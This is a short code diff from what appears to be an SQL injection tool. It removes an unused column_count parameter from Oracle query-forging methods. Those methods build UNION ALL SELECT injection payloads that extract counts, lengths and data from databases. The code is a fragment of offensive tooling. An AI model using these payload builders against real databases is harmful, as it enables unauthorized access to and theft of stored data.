@@ -119,7 +119,7 @@ class OracleMole(DbmsMole):
             return OracleMole.integer_field_finger_result
 
 
-    def forge_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
+    def forge_count_query(self, fields, table_name, injectable_field, where = "1=1"):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = OracleMole.out_delimiter + '||cast(count(*) as varchar2(150))||' + OracleMole.out_delimiter
@@ -127,7 +127,7 @@ class OracleMole(DbmsMole):
         query += ' from ' + table_name + ' where ' + self.parse_condition(where)
         return query
 
-    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_query(self, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ("(" +
@@ -142,7 +142,7 @@ class OracleMole(DbmsMole):
         query += " where r = " + str(offset + 1)
         return query
 
-    def forge_integer_count_query(self, column_count, fields, table_name, injectable_field, where = "1=1"):
+    def forge_integer_count_query(self, fields, table_name, injectable_field, where = "1=1"):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ('cast(cast(' + OracleMole.integer_out_delimiter +
@@ -152,7 +152,7 @@ class OracleMole(DbmsMole):
         query += ' from ' + table_name + ' where ' + self.parse_condition(where)
         return query
 
-    def forge_integer_len_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_integer_len_query(self, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ("cast (cast(" +
@@ -167,7 +167,7 @@ class OracleMole(DbmsMole):
         query += " where r = " + str(offset + 1)
         return query
 
-    def forge_integer_query(self, column_count, index, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_integer_query(self, index, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1=0 UNION ALL SELECT "
         query_list = list(self.finger._query)
         query_list[injectable_field] = ("cast(cast(" +
